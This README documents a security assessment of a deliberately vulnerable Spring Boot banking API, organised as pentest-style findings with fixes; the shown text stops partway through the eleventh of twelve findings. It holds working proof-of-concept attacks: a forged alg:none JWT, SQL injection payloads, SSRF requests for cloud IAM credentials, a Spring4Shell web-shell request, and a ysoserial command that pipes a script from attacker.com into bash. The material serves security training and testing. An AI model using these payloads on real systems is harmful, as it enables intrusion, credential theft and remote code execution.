# Java Enterprise App Security Assessment

> **A complete, end-to-end security assessment of a Spring Boot financial REST API — combining automated static analysis, dependency scanning, and live dynamic attack testing into one reproducible pipeline.**

---

## Table of Contents

1. [What This Project Is, In Plain Words](#what-this-project-is-in-plain-words)
2. [The Target Application — FinSecure API](#the-target-application--finsecure-api)
3. [Every Endpoint — What It Does and How It Works](#every-endpoint--what-it-does-and-how-it-works)
4. [The Assessment Pipeline — How It All Works](#the-assessment-pipeline--how-it-all-works)
5. [All 12 Findings — Full Detail](#all-12-findings--full-detail)
6. [Custom Semgrep Rules — What They Catch and How](#custom-semgrep-rules--what-they-catch-and-how)
7. [The SBOM — Your Software Ingredient List](#the-sbom--your-software-ingredient-list)
8. [The Docker Setup and Its Security Issues](#the-docker-setup-and-its-security-issues)
9. [Project File Map — Every File Explained](#project-file-map--every-file-explained)
10. [How This Compares to Commercial and Free Tools](#how-this-compares-to-commercial-and-free-tools)
11. [How to Run Everything](#how-to-run-everything)

---
## What This Project Is, In Plain Words

Imagine you are a security engineer hired to check whether a banking API is safe before it goes live. You cannot just click around the website — you need to:

1. **Read the source code** and spot dangerous patterns before anyone even runs the app.
2. **Check every third-party library** the app uses against a global database of known vulnerabilities.
3. **Actually attack the running app** the same way a real hacker would — forge fake login tokens, inject SQL commands, probe internal servers.
4. **Write a report** that a developer can act on immediately, with exact steps to reproduce each problem and exact code changes to fix it.

That is exactly what this project does — and it does all four steps automatically, in sequence, with a single command.

The app being assessed is called **FinSecure API** — a deliberately broken financial REST API built in Spring Boot (Java). It was designed from scratch with realistic security mistakes baked in, so there is a real target to test against. The assessment framework built around it is written in Python and uses industry-standard tools: Semgrep, OWASP Dependency-Check, and live dynamic attack scripts modelled after Burp Suite Pro workflows.

The result is a **12-finding security report**, sorted by severity, with CVSS v3.1 scores, proof-of-concept attack steps, business impact statements, and concrete remediation guidance — exactly the format professional penetration testers deliver to clients.

---

## The Target Application — FinSecure API

The target is a **Spring Boot 2.6.3** financial REST API named **FinSecure**. It simulates a real-world banking backend: users register, log in, manage accounts, and view balances. It uses:

- **Java 17** with Spring Boot
- **Spring Security** for authentication
- **JWT (JSON Web Tokens)** for session management
- **Spring Data JPA + H2** in-memory database
- **Spring JDBC Template** for raw SQL queries
- **Jackson Databind** for JSON parsing

The application source lives in `target-app/src/main/java/com/finsecure/`.

Every file in the target app contains carefully documented, intentional vulnerabilities. Here is a summary of what was deliberately broken and exactly where:

**In `JwtFilter.java`:**
- Uses `parseClaimsJwt()` instead of `parseClaimsJws()` — accepts tokens with no signature (alg:none bypass)
- Signing key `SECRET_KEY = "secret123"` is hardcoded in source code
- Never checks token expiration — expired tokens work forever
- Swallows JWT errors silently and leaks error text in response headers

**In `AuthController.java`:**
- Same `SECRET_KEY = "secret123"` hardcoded again in a second location
- JWT builder never calls `.setExpiration()` — tokens have no expiry
- Password comparison uses plain text (no hashing)

**In `AccountController.java`:**
- `getAccountById()` has no ownership check (IDOR — any user sees any account)
- `createAccount()` accepts full JSON body including `isAdmin` (mass assignment)
- `searchByNote()` builds SQL by string concatenation (second-order SQL injection)
- Error handler returns raw SQL error messages to the caller

**In `SecurityConfig.java`:**
- CSRF disabled entirely — all POST/PUT/DELETE endpoints vulnerable to cross-site attacks
- `allowedOrigins("*")` — any website can make cross-origin API requests
- `NoOpPasswordEncoder` — passwords stored and compared as plain text
- `/h2-console/**` fully public — anyone can access the database console

**In `application.properties`:**
- `spring.h2.console.settings.web-allow-others=true` — H2 console open to network
- `management.endpoints.web.exposure.include=health,info,env,beans` — Actuator endpoints expose all environment variables
- `server.error.include-stacktrace=always` — full Java stack traces in HTTP responses
- SQL queries logged at DEBUG level — sensitive query patterns in log files

**In `pom.xml`:**
- Spring Boot `2.6.3` pulls in Spring4Shell (CVE-2022-22965)
- `jackson-databind 2.13.2` (CVE-2022-42003, CVE-2022-42004)
- `commons-collections 3.1` (CVE-2015-6420 — Java deserialization RCE gadget chain)

**In `Dockerfile`:**
- No `USER` directive — container runs as root
- JDWP debug port 5005 exposed (`address=*:5005`) — allows remote Java debugger attachment
- Full JDK base image instead of minimal JRE or distroless

---
## Every Endpoint — What It Does and How It Works

### Authentication Endpoints (`/api/auth`)

**`POST /api/auth/register`**

What it does: Creates a new user account. You send a JSON body with a username and password, and it saves the user to the database.

How it works: The `User` object is taken directly from the JSON request body and saved using `userRepository.save(user)`. No password hashing happens — the password is stored in the database exactly as typed, using Spring's `NoOpPasswordEncoder`.

Security issue: If the database is ever read (by an attacker, a rogue employee, or a breach), every user's password is exposed in plain text. A real app uses bcrypt with at least 10 rounds so that even if the database leaks, cracking the passwords is computationally infeasible.

---

**`POST /api/auth/login`**

What it does: Checks username and password, and if correct, returns a JWT token. That token is included in every future request as proof of identity (in the `Authorization: Bearer <token>` header).

How it works: It looks up the user by username, compares the provided password directly against the stored one (plain text comparison), then builds a JWT using the JJWT library. The JWT is signed with the hardcoded secret `secret123` using HS256, has no expiration date set, and carries the user's role inside it.

Security issues:
- The secret `secret123` is written directly in the code. Anyone who reads the source code or decompiles the JAR file can forge valid tokens for any user.
- Tokens never expire. A stolen token works forever — there is no time window after which it becomes invalid.
- Plain text password comparison.

---

### Account Endpoints (`/api/accounts`)

**`GET /api/accounts`**

What it does: Returns a list of all accounts in the system.

How it works: Calls `accountRepository.findAll()` and returns the full list with zero filtering. Every authenticated user, regardless of their role, sees every account in the database.

Security issue: A real bank app filters this list to only show accounts the requesting user owns. Here, any logged-in user immediately sees all customer names, emails, account numbers, and balances.

---

**`GET /api/accounts/{id}`**

What it does: Returns the details of a single account identified by its numeric ID.

How it works: Looks up the account by `id` in the database and returns it. There is **no check** that the logged-in user owns account number `{id}`.

Security issue — IDOR: If you are logged in as Alice (account ID 1), you can request `/api/accounts/2` and get Bob's account, `/api/accounts/3` for Charlie, and `/api/accounts/4` for the admin's account (balance: $9,999,999). An attacker writes a loop that increments the number from 1 to 50,000 and harvests every account in the database.

The code has this comment written inside it:

`java
// VULN-2: There is NO check here that the JWT principal owns account {id}.
`

Fix — one line added to the controller:
`java
String currentUser = SecurityContextHolder.getContext().getAuthentication().getName();
if (!account.getOwnerEmail().equals(currentUser)) {
    return ResponseEntity.status(403).build();
}
`

---

**`POST /api/accounts`**

What it does: Creates a new account. You send a JSON body with owner name, email, and balance.

How it works: The JSON body is deserialized directly into the `Account` Java object using `@RequestBody Account account`, then saved. The `Account` model has an `isAdmin` field that controls admin privileges — and because the entire JSON body maps straight to the object, a user can include `"isAdmin": true` in their request and create an account with admin privileges.

Security issue — Mass Assignment: The `isAdmin` field was supposed to be internal — set only by the system — but because there is no separate input object (a DTO), any JSON field the attacker sends gets written to the database.

Attack: `POST /api/accounts` with body `{"ownerName":"Hacker","balance":0,"isAdmin":true}` — response includes `"isAdmin": true`. The attacker now has admin access.

Fix: Create an `AccountRequest` DTO with only the safe fields (ownerName, ownerEmail, balance), then map it to the `Account` entity manually. Add `@JsonIgnore` on the `isAdmin` getter as defence-in-depth.

---

**`POST /api/accounts/{id}/note`**

What it does: Stores a text note on an account. This is Part 1 of a two-step attack.

How it works: Takes a JSON body with a `note` field, looks up the account by `{id}`, sets the `profileNote` field on the account object, and saves it. The note appears to be stored safely — the database just holds a string.

Security issue (first half): The note is stored without any sanitisation. If the note contains a SQL injection payload like `' OR '1'='1`, that exact string goes into the database. It looks completely harmless at storage time — but it becomes dangerous when the next endpoint reads it back.

---

**`GET /api/accounts/search?note={query}`**

What it does: Searches for accounts by their profile note. This is Part 2 — the trigger for the second-order SQL injection attack.

How it works: Takes the `note` query parameter and plugs it directly into a SQL string using string concatenation:

`java
String sql = "SELECT * FROM accounts WHERE profile_note = '" + note + "'";
jdbcTemplate.queryForList(sql);
`

If `note` contains SQL syntax, the database executes it.

Security issue — Second-Order SQL Injection: Here is the full attack step by step:

1. Alice stores a note on her account: `POST /api/accounts/1/note` with body `{"note": "' OR '1'='1"}`. The database stores this string. At this point, it looks completely safe — there is no SQL execution yet.
2. Alice (or an admin) triggers the search: `GET /api/accounts/search?note=' OR '1'='1`.
3. The SQL the server executes becomes:
   `SELECT * FROM accounts WHERE profile_note = '' OR '1'='1'`
4. Since `'1'='1'` is always true, this returns every single account in the database.
5. With a UNION payload: `' UNION SELECT account_number,owner_name,balance,owner_email,profile_note,is_admin,id FROM accounts--` — the attacker extracts every column of every row.

Why "second-order"? The payload was stored in step 1 (first request) and triggered in step 2 (a completely different request, possibly much later). Many Web Application Firewalls inspect input only at storage time — they see a harmless string being saved and do not raise an alert. The attack bypasses them entirely.

When an error occurs (e.g. malformed SQL), the raw SQL error message from H2 is returned to the caller, revealing the database type, SQL dialect, and query structure — extra information that lets an attacker refine their payload.

Fix — one line change:
`java
// Vulnerable:
String sql = "SELECT * FROM accounts WHERE profile_note = '" + note + "'";
jdbcTemplate.queryForList(sql);

// Fixed — parameterized query:
jdbcTemplate.query("SELECT * FROM accounts WHERE profile_note = ?",
    new Object[]{note}, rowMapper);
`

---

**`GET /api/accounts/admin/all`**

What it does: An admin-only endpoint that returns all accounts plus the total count.

How it works: Returns every account and the total count. The endpoint is supposed to require admin role — but because the JWT filter accepts `alg:none` tokens (see FIND-002), any attacker can forge a token claiming `role: ADMIN` and access it without ever logging in.

---

### Utility Endpoints (`/api`)

**`GET /api/fetch?url={url}`**

What it does: Fetches a URL provided by the user and returns the full response body, status code, and headers back to the caller.

How it works: Takes the `url` query parameter, creates a `java.net.URL` object from it, opens an HTTP connection, reads the response, and returns everything to the caller. There is absolutely no URL validation.

Security issue — SSRF: Because the server makes the request on behalf of the user, the request comes from inside the server's own network. The attacker's browser never touches the internal network — the server does it for them.

What an attacker can do with this:

- `GET /api/fetch?url=http://localhost:8080/actuator/env` → server fetches its own Spring Actuator endpoint and returns all environment variables (including secrets, database credentials, API keys) to the attacker.
- `GET /api/fetch?url=http://localhost:8080/h2-console` → server fetches its own database console.
- On AWS: `GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` → server fetches the AWS metadata service and returns IAM credentials — Access Key ID, Secret Access Key, session token. The attacker now controls the entire cloud account.
- On GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Error messages returned on failure (e.g. `"Connection refused to localhost:6379"`) reveal which internal ports are open — enabling port scanning of the entire internal network through the server's responses.

Fix: Implement a strict URL allowlist. Block all private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x), loopback (127.x.x.x), and cloud metadata IPs (169.254.169.254). Consider removing the endpoint entirely if not required.

---

**`GET /api/health`**

What it does: Returns the health status of the application.

How it works: Returns a JSON object with `status: "UP"`, service name, version, and — critically — the exact Java version and OS name from `System.getProperty()`.

Security issue: Exposing the exact Java version (`java.version: 17.0.18`) and OS in a public endpoint gives an attacker free reconnaissance. They can look up CVEs for that exact JDK version and target them specifically. This is rated low severity on its own but amplifies every other finding.

---
## The Assessment Pipeline — How It All Works

The entire assessment runs as a four-phase pipeline. The master script `orchestrator.py` runs them in sequence:

`
SAST (Semgrep) --> SCA (Dependency-Check + SBOM) --> DAST (Live Attacks) --> Report (HTML)
`

Run the full pipeline with one command:
`ash
python orchestrator.py --target http://localhost:8080 --source target-app/src
`

Or in demo mode (no tools required — uses pre-generated data):
`ash
python orchestrator.py --demo --skip-dast
`

---

### Phase 1 — SAST: Reading the Code Without Running It

**Script:** `assessment/sast/run_sast.py`

SAST (Static Application Security Testing) analyses the Java source code as text — without running the application — and detects dangerous patterns.

It runs the Semgrep tool pointed at `target-app/src/` with four custom rule files. Semgrep parses every Java file, matches them against patterns defined in YAML, and returns a JSON list of matches with file paths and line numbers.

The runner enriches each finding with:
- OWASP Top 10 category (e.g., "A03:2021 - Injection")
- CVSS v3.1 score from a lookup table per rule ID
- Severity level (CRITICAL / HIGH / MEDIUM / LOW)

All findings are saved to `findings/sast_results.json`.

**Why SAST matters:** It finds bugs before deployment. You catch the SQL injection in code review, not after a breach. No server needs to be running. You get exact file names and line numbers.

**Demo mode:** If Semgrep is not installed, the script falls back to 6 pre-generated sample findings from the real FinSecure codebase — the rest of the pipeline still works.

---

### Phase 2 — SCA: Checking Every Library for Known CVEs

SCA (Software Composition Analysis) checks every third-party library declared in `pom.xml` against a database of publicly known vulnerabilities (CVEs).

#### `dependency_check.py`

Runs OWASP Dependency-Check against `pom.xml`. This tool downloads the NVD (National Vulnerability Database) and cross-references every library version against known CVEs. The output is an XML report.

The script parses that XML and extracts:
- CVE ID
- Affected library and version
- CVSS score and severity
- Fix version recommendation

CVEs found in FinSecure:

| CVE | Library | CVSS | Impact |
|-----|---------|------|--------|
| CVE-2022-22965 | spring-webmvc 5.3.15 | 9.8 CRITICAL | Spring4Shell — unauthenticated RCE |
| CVE-2015-6420 | commons-collections 3.1 | 7.5 HIGH | Java deserialization RCE gadget chain |
| CVE-2022-42003 | jackson-databind 2.13.2 | 7.5 HIGH | Denial of Service via deeply nested JSON |
| CVE-2022-42004 | jackson-databind 2.13.2 | 7.5 HIGH | Same vulnerability, different code path |

#### `sbom_generator.py`

Generates an **SBOM (Software Bill of Materials)** in **CycloneDX 1.4** format using the **Syft** tool. Think of an SBOM as an ingredient list for software — it lists every library the application depends on, including transitive dependencies (libraries that your libraries depend on).

The FinSecure SBOM lists 15 components. The script cross-references them against known vulnerabilities and flags affected ones.

**Why SBOMs matter:** After Log4Shell (CVE-2021-44228), organisations discovered they had Log4j in applications they did not even know used it. An SBOM tells you exactly what is in your software so you can respond immediately when a new CVE drops.

#### `cve_enricher.py`

Takes raw CVE IDs from Dependency-Check and fetches additional context from the NVD API: full description, CVSS vector string, CWE classification, and reference links. Saves enriched data to `findings/enriched_cves.json`.

---

### Phase 3 — DAST: Actually Attacking the Running App

DAST (Dynamic Application Security Testing) runs the application and sends real HTTP requests designed to exploit vulnerabilities. Four modules, each targeting a different attack class:

#### `assessment/dast/auth_tester.py` — JWT Authentication Testing

**Test 1: JWT alg:none Bypass**

Crafts a forged JWT token with no signature:
- Header: `{"alg":"none","typ":"JWT"}` base64url encoded
- Payload: `{"sub":"admin","role":"ADMIN","userId":1}` base64url encoded
- Signature: empty (just a trailing dot)
- Token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiJ9.`

Sends this to `GET /api/accounts` and `GET /api/accounts/admin/all`. HTTP 200 confirms the bypass.

**Test 2: JWT Secret Brute-Force**

Gets a real signed token from `/api/auth/login`, then tries re-signing it with 25 common secrets from a built-in wordlist. For each candidate, it computes HMAC-SHA256 and compares against the real token's signature. When `secret123` matches, the test confirms the secret is crackable.

**Test 3: Authorization Enforcement**

Sends requests to four protected endpoints with no Authorization header, and with an invalid token. Flags any endpoint that returns HTTP 200 when it should return 401 or 403.

---

#### `assessment/dast/sqli_tester.py` — SQL Injection Testing

**Test 1: Time-Based Blind SQLi**

Sends five payloads to `/api/accounts/search` and measures response time. If the response takes more than 2.5 seconds, the server executed a sleep command — confirming blind SQL injection. Also checks for SQL error keywords in response bodies.

Payloads tested:
- `' OR SLEEP(3)--`
- `'; CALL SLEEP(3)--`
- `' OR '1'='1`
- `' --`
- `' UNION SELECT NULL--`

**Test 2: Second-Order SQLi**

Runs the full two-step attack automatically:
1. `POST /api/accounts/1/note` with body `{"note": "' OR '1'='1"}`
2. `GET /api/accounts/search?note=' OR '1'='1`

Checks if the response returns more rows than expected. More than 1 row confirms the injection.

**Test 3: Union-Based Data Extraction**

Attempts UNION SELECT attacks to discover column count and extract database table names and version information.

---

#### `assessment/dast/access_control.py` — Access Control Testing

**Test 1: Horizontal IDOR Enumeration**

Logs in as `alice` (owns account ID 1), then loops account IDs 1 to 50. Any account returned where the owner email does not match `alice` is an IDOR hit. In FinSecure, this exposes 3 other users' accounts including the admin account with $9,999,999.

**Test 2: Vertical Privilege Escalation**

Uses alice's regular-user JWT to access admin endpoints:
- `GET /api/accounts/admin/all` — admin account listing
- `GET /actuator/env` — all Spring environment variables
- `GET /actuator/beans` — Spring bean definitions
- `GET /h2-console` — database console

Any HTTP 200 for a regular-user token is a privilege escalation finding.

**Mass Assignment Test**

`POST /api/accounts` with body `{"ownerName":"HackerAdmin","balance":0,"isAdmin":true}`. If the response includes `"isAdmin": true`, the admin flag was accepted and the vulnerability is confirmed.

---

#### `assessment/dast/ssrf_tester.py` — SSRF Testing

**Test 1 and 2: Internal and Cloud SSRF**

Sends 10 requests to `/api/fetch?url=...` with internal and cloud metadata URLs. If the server returns a body from internal URLs (actuator, h2-console), SSRF is confirmed. If it returns error messages mentioning internal hosts, blind SSRF is confirmed.

Cloud metadata targets tested (critical if app is cloud-hosted):
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IAM creds)
- `http://metadata.google.internal/computeMetadata/v1/` (GCP)
- `http://169.254.169.254/metadata/instance` (Azure)

**Test 3: Blind SSRF via Timing**

Compares response times between known-closed and potentially open internal ports. A closed port responds in milliseconds (immediate refusal). An open or filtered port responds after the timeout. This enables internal port scanning through FinSecure as an unwitting proxy.

---

### Phase 4 — Reporting: Turning Raw Data Into an HTML Report

**Script:** `report/report_generator.py`
**Template:** `report/templates/report_template.html`
**Output:** `report/output/security_report.html`

Reads `findings/sample_findings.json` (the curated 12-finding detailed data) and generates a full HTML report. The orchestrator also merges all phase findings into `findings/all_findings.json` before report generation.

The report includes:
- Executive summary with severity breakdown
- Full findings table sortable by CVSS score
- For each finding: description, evidence, PoC steps, business impact, remediation, and effort estimate
- CVSS v3.1 vector strings
- OWASP Top 10 category references
- CWE classifications

Open `report/output/security_report.html` in any browser to view the complete assessment.

---
## All 12 Findings — Full Detail

Every finding is listed with its severity, CVSS score, CWE classification, exact location in code, what the attacker does, what data they get, and how to fix it.

---

### FIND-001 — Second-Order SQL Injection in `/api/accounts/search`

**Severity:** CRITICAL | **CVSS:** 9.8 | **CWE:** CWE-89 | **OWASP:** A03:2021 Injection

**Location:** `AccountController.java`, `searchByNote()` method, line 144

**What the code does wrong:**
`java
// This is the exact vulnerable line:
String sql = "SELECT * FROM accounts WHERE profile_note = '" + note + "'";
List<Map<String, Object>> results = jdbcTemplate.queryForList(sql);
`

**The attack in steps:**
1. Store the payload: `POST /api/accounts/1/note` with body `{"note": "' OR '1'='1"}`
2. Trigger it: `GET /api/accounts/search?note=' OR '1'='1`
3. SQL executed: `SELECT * FROM accounts WHERE profile_note = '' OR '1'='1'`
4. Result: every account in the database returned — names, emails, balances, account numbers

For full extraction:
`GET /api/accounts/search?note=' UNION SELECT account_number,owner_name,balance,owner_email,profile_note,is_admin,id FROM accounts--`

**Why WAFs miss this:** The payload is stored in step 1 (where it looks harmless) and triggered in step 2 (a different request). Most WAFs inspect input at storage time only.

**Business impact:** Complete financial database exposure. Attacker can read all customer data. With INSERT/UPDATE access (depending on DB permissions), they can modify account balances or create fraudulent transactions.

**Fix:** Use a parameterized query (one-line change):
`java
jdbcTemplate.query("SELECT * FROM accounts WHERE profile_note = ?",
    new Object[]{note}, rowMapper);
`
**Remediation effort:** Low

---

### FIND-002 — JWT Algorithm Confusion (alg:none Bypass)

**Severity:** CRITICAL | **CVSS:** 9.1 | **CWE:** CWE-347 | **OWASP:** A02:2021 Cryptographic Failures

**Location:** `JwtFilter.java`, `doFilterInternal()` method, line 66

**What the code does wrong:**
`java
// WRONG — parseClaimsJwt accepts tokens with no signature:
Claims claims = Jwts.parser()
    // .setSigningKey(SECRET_KEY)  <-- INTENTIONALLY COMMENTED OUT
    .parseClaimsJwt(token)         // accepts unsigned tokens
    .getBody();
`

**The attack:**
1. Construct token header: base64url(`{"alg":"none","typ":"JWT"}`)
   = `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
2. Construct payload: base64url(`{"sub":"admin","role":"ADMIN","userId":4}`)
   = `eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIsInVzZXJJZCI6NH0`
3. No signature — just a trailing dot
4. Full token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIsInVzZXJJZCI6NH0.`
5. `GET /api/accounts` with `Authorization: Bearer <forged-token>` -- returns HTTP 200 with all accounts

**Business impact:** Complete authentication bypass. No password required. Attacker impersonates any user, including administrators. Can access all financial data, create fraudulent transactions, modify account balances.

**Fix:**
`java
// CORRECT — always verify the signature:
Claims claims = Jwts.parserBuilder()
    .setSigningKey(Keys.hmacShaKeyFor(secret.getBytes(StandardCharsets.UTF_8)))
    .build()
    .parseClaimsJws(token)  // parseClaimsJws (with 's') verifies the signature
    .getBody();
`
**Remediation effort:** Low

---

### FIND-003 — Horizontal IDOR — Cross-User Account Data Exposure

**Severity:** HIGH | **CVSS:** 8.1 | **CWE:** CWE-639 | **OWASP:** A01:2021 Broken Access Control

**Location:** `AccountController.java`, `getAccountById()` method, line 64

**What the code does wrong:**
`java
@GetMapping("/{id}")
public ResponseEntity<?> getAccountById(@PathVariable Long id) {
    // VULN: No ownership check. Any user can request any ID.
    Optional<Account> account = accountRepository.findById(id);
    return account.map(ResponseEntity::ok).orElse(ResponseEntity.notFound().build());
}
`

**The attack:**
- Login as alice (owns account ID 1)
- `GET /api/accounts/2` -- returns Bob's account: `{balance: 78250.00, ownerEmail: bob@finsecure.com, accountNumber: ACC-002}`
- `GET /api/accounts/3` -- returns Charlie's account
- `GET /api/accounts/4` -- returns Admin account with `balance: 9999999.00`
- Script loops IDs 1--50,000 to harvest the entire database

**Business impact:** Full financial data exposure for all customers. Violates GDPR Article 32, PCI-DSS Requirement 7, and FFIEC guidelines. Regulatory fines and potential class-action liability.

**Fix:**
`java
String currentUser = SecurityContextHolder.getContext().getAuthentication().getName();
if (!account.getOwnerEmail().equals(currentUser)) {
    return ResponseEntity.status(403).body("Forbidden");
}
`
**Remediation effort:** Low

---

### FIND-004 — Hardcoded JWT Signing Secret

**Severity:** HIGH | **CVSS:** 7.5 | **CWE:** CWE-798 | **OWASP:** A07:2021 Identification and Authentication Failures

**Location:** `JwtFilter.java` line 48, `AuthController.java` line 26

**What the code does wrong:**
`java
// Hardcoded in TWO files:
private static final String SECRET_KEY = "secret123";
`

**Why it matters (separate from FIND-002):** Even if the alg:none bug were fixed, this secret allows forging properly signed HS256 tokens. The secret was brute-forced from a 25-entry wordlist in milliseconds.

**Attack:** Decompile the JAR file (`javap -c` or CFR/Procyon decompiler). Find `SECRET_KEY = "secret123"`. Use it to forge signed tokens for any user:
`java
Jwts.builder()
    .setSubject("admin")
    .claim("role", "ADMIN")
    .signWith(SignatureAlgorithm.HS256, "secret123")
    .compact();
`

**Fix:** Load from environment variable:
`java
// application.properties:  jwt.secret=
// Java:
@Value("") private String jwtSecret;
// Deploy: set JWT_SECRET to 32+ cryptographically random bytes in a secrets manager
`
**Remediation effort:** Low

---

### FIND-005 — Mass Assignment — Admin Privilege Injection

**Severity:** HIGH | **CVSS:** 8.8 | **CWE:** CWE-915 | **OWASP:** A08:2021 Software and Data Integrity Failures

**Location:** `AccountController.java`, `createAccount()`, and `Account.java` model

**The attack:**
`
POST /api/accounts
Content-Type: application/json
{"ownerName":"Hacker","balance":0,"isAdmin":true}

Response: {"id":5,"ownerName":"Hacker","isAdmin":true}
`

The `isAdmin: true` flag is accepted, stored in the database, and returned in the response. Any authenticated user can now self-escalate to administrator.

**Root cause:** `@RequestBody Account account` deserialises the entire JSON body directly into the entity — including fields that should only be settable internally. The `Account` model has no `@JsonIgnore` on `isAdmin`.

**Fix:** Create a separate `AccountRequest` DTO:
`java
public class AccountRequest {
    private String ownerName;  // only expose safe fields
    private String ownerEmail;
    private Double balance;
    // isAdmin is NOT here
}
`
**Remediation effort:** Low

---

### FIND-006 — Server-Side Request Forgery (SSRF) via `/api/fetch`

**Severity:** HIGH | **CVSS:** 7.2 | **CWE:** CWE-918 | **OWASP:** A10:2021 SSRF

**Location:** `UtilController.java`, `fetchUrl()` method, lines 52--79

**The attack (internal):**
`GET /api/fetch?url=http://localhost:8080/actuator/env`
Returns: all Spring environment variables including database passwords, API keys, JWT secrets configured via environment

**The attack (cloud — most critical):**
`GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
Returns on AWS: `{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}`
With these credentials, the attacker controls the entire AWS account — S3 buckets, RDS databases, EC2 instances, everything.

**The attack (blind port scan):**
`GET /api/fetch?url=http://127.0.0.1:6379`
Response error: `"Connection refused to 127.0.0.1:6379"` -- confirms Redis port is closed
`GET /api/fetch?url=http://127.0.0.1:3306`
Response error: `"Connection refused to 127.0.0.1:3306"` -- confirms MySQL is closed
Error messages reveal the internal network topology.

**Fix:** Implement URL allowlist and block private IP ranges:
`java
URI uri = new URI(url);
String host = InetAddress.getByName(uri.getHost()).getHostAddress();
if (host.startsWith("10.") || host.startsWith("192.168.") ||
    host.startsWith("172.16.") || host.startsWith("127.") ||
    host.startsWith("169.254.")) {
    return ResponseEntity.badRequest().body("URL not allowed");
}
`
**Remediation effort:** Medium

---

### FIND-007 — Jackson Databind CVE-2022-42003 (Denial of Service)

**Severity:** HIGH | **CVSS:** 7.5 | **CWE:** CWE-400 | **OWASP:** A06:2021 Vulnerable and Outdated Components

**Location:** `pom.xml` — `jackson-databind:2.13.2`

**What happens:** Sending a JSON request body with deeply nested arrays (e.g., 10,000 levels of `[[[[...]]]]`) causes the Jackson deserialiser to enter an exponential processing loop. The server's CPU spikes to 100% and becomes unresponsive.

**Business impact in finance:** A financial API going down means customers cannot access their accounts, execute trades, or make payments. In regulated environments, downtime above SLA triggers penalty clauses and regulatory reporting requirements.

**Fix:** Upgrade in `pom.xml`:
`xml
<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.13.4.2</version>  <!-- was 2.13.2 -->
</dependency>
`
**Remediation effort:** Low

---

### FIND-008 — Apache Commons Collections 3.1 — Deserialization RCE (CVE-2015-6420)

**Severity:** HIGH (CVSS 7.5) / effectively CRITICAL in practice | **CWE:** CWE-502 | **OWASP:** A06:2021

**Location:** `pom.xml` — `commons-collections:commons-collections:3.1`

**What this enables:** Commons Collections 3.1 contains the `CommonsCollections1` through `CommonsCollections7` gadget chains used by the `ysoserial` tool. If any endpoint in the application or its middleware accepts Java serialized objects, an attacker can achieve Remote Code Execution.

This exact vulnerability was used to compromise WebLogic, JBoss, and Jenkins servers at massive scale in 2015--2016.

**Attack:**
`ash
# Generate the RCE payload:
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash' > payload.ser

# Send to any endpoint accepting serialized Java objects
curl -X POST http://localhost:8080/api/accounts \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# Command executes as root (because Dockerfile has no USER directive)
`

**Business impact:** Full server compromise. Attacker gets a shell, can read the entire database, deploy persistence mechanisms, and pivot to internal network. In Docker running as root, this can enable container escape to the host.

**Fix:** Upgrade `commons-collections` to `3.2.2` in `pom.xml`. Implement Java serialisation filter (JEP 290) to block unrecognised classes.

**Remediation effort:** Low

---

### FIND-009 — Spring Framework RCE — Spring4Shell (CVE-2022-22965)

**Severity:** CRITICAL | **CVSS:** 9.8 | **CWE:** CWE-94 | **OWASP:** A06:2021

**Location:** `pom.xml` — `spring-boot-starter-parent:2.6.3` (pulls in `spring-webmvc:5.3.15`)

**What this is:** Spring4Shell is an unauthenticated Remote Code Execution vulnerability in Spring Framework 5.3.x before 5.3.18. On JDK 9+, a specially crafted HTTP request abusing Spring MVC's data binding and class loader access can write a JSP web shell to the Tomcat webroot.

This application runs on JDK 17 (confirmed via `/api/health`), satisfying the vulnerability prerequisite.

**Attack (WAR deployment on Tomcat):**
`ash
curl -v 'http://localhost:8080/api/accounts?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&c2=...webshell...'
# Web shell written to server. Then:
curl 'http://localhost:8080/shell.jsp?pwd=j&cmd=id'
# Returns: uid=0(root) -- Remote Code Execution confirmed
`

**Business impact:** Complete server compromise via unauthenticated request. No login, no credentials, no prerequisites — any network-reachable instance is vulnerable.

**Fix:** Upgrade `spring-boot-starter-parent` to version `2.6.6` or higher:
`xml
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>2.6.6</version>  <!-- was 2.6.3 -->
</parent>
`
This vulnerability is actively exploited in the wild. Apply immediately.

**Remediation effort:** Low

---

### FIND-010 — JWT Token Without Expiration

**Severity:** MEDIUM | **CVSS:** 6.5 | **CWE:** CWE-613 | **OWASP:** A07:2021

**Location:** `AuthController.java`, `login()` JWT builder, line 64 (comment says "Secure fix:" but expiration is never actually set)

**Decoded JWT payload:** `{"sub":"alice","role":"USER","userId":1,"iat":1718367240}` — no `exp` field.

**What this means:** A token issued at login remains valid forever. If stolen via XSS, MITM, server logs, mobile device theft, or any other vector, the token grants permanent access with no time-limited window.

Token tested valid 24+ hours after issuance. The only way to invalidate it is to restart the server (which clears the H2 in-memory database) or rotate the signing secret (which invalidates all users' sessions simultaneously).

**Fix:**
`java
.setExpiration(new Date(System.currentTimeMillis() + 3_600_000)) // 1 hour
`
Implement a refresh token flow for seamless re-authentication on expiry.

**Remediation effort:** Low

---

### FIND-011 — Wildcard CORS — Cross-Origin Access Permitted

**Severity:** MEDIUM | **CVSS:** 6.1 | **CWE:** CWE-942 | **OWASP:** A05:2021 Security Misconfiguration

**Location:** `SecurityConfig.java`, `corsConfigurationSource()` — `allowedOrigins("*")`

**What this enables:** Any website can make cross-origin requests to the API and read the responses. Combined with disabled CSRF, any malicious page can make authenticated API calls using a victim's stolen JWT.

**Evidence:** `curl -H 'Origin: http://evil.com' http://localhost:8080/api/health` returns `Access-Control-Allow-Origin: *`.

